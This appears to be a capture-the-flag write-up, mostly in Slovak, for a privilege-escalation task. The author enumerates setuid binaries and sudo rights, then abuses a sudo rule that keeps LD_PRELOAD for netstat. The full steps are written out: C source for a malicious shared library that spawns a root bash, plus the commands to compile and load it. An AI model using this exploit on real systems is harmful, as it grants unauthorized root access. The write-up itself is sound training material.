Úloha 2

EN: That is interesting functionality. We can see that a separate user was created to run the calculator, but maybe the root user has more secrets that can be uncovered.

SK: Je to zaujímavá funkcionalita. Vidíme, že bol vytvorený samostatný používateľ na spustenie kalkulačky, ale možno má používateľ root viac tajomstiev, 
ktoré môžu byť odhalené.


Riešenie:
Keďže sa úloha nachádza v sekcii Binary Exploitation, nechal som si vypísať všetky setuid binárky (niektoré z nich sa môžu spúšťať s root oprávneniami)
calc@8e501fd9750e:~$ find / -perm -4000 -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/umount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/sudo
/run/docker/bin/ls

Tu ale cesta neviedla...

Hľadal som ďalej...
calc@7333718b2ec5:/etc/systemd$ sudo -l
Matching Defaults entries for calc on 7333718b2ec5:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty, env_keep+=LD_PRELOAD

User calc may run the following commands on 7333718b2ec5:
    (ALL) NOPASSWD: /bin/netstat

Čo znamená, že môžem spustiť /bin/netstat ako root bez zadania hesla, čo som bral ako cestu dostať sa k rootovi.
"env_keep+=LD_PRELOAD" znamená, že môžem injektnúť vlastnú .so knižnicu, ktorá sa automaticky načíta, keď spustíš netstat cez sudo.

Vytvoril som si script rootshell.c:
echo '#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash");
}' > /tmp/rootshell.c

Následne som kompiloval knižnicu:
gcc -fPIC -shared -o /tmp/rootshell.so /tmp/rootshell.c -nostartfiles

A následne spustil root shell cez sudo + LD_PRELOAD
sudo LD_PRELOAD=/tmp/rootshell.so /bin/netstat

root@123676836ed1:/tmp# id
uid=0(root) gid=0(root) groups=0(root)

A je to, vlajka sa nachadza v /root/flag.txt
